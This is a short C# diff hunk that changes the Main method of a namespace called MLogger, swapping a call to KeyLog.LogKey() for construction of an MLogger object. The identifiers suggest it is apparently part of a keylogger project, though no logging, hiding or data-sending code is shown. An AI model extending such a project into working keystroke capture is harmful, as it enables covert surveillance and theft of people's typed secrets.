@@ -9,7 +9,7 @@ namespace MLogger
     {
         public static void Main()
         {
-            KeyLog.LogKey();
+            new MLogger();
         }
     }
 }
